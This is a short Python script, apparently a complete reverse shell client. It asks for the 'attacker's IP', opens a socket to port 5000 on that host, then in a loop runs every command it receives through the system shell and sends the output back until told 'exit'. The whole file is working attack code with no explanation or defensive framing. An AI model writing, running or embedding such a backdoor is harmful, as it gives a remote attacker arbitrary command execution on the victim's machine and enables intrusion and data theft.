import socket
import subprocess
import sys

HOST = input("Enter attacker's IP: ")
PORT = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((HOST, PORT))
except:
    print("Please enter valid IP address")
    sys.exit(1)

print("Connected to server")

while True:
    command = sock.recv(1024).decode()
    if command == "exit":
        break

    output = subprocess.getoutput(command)

    sock.send(output.encode())

sock.close()
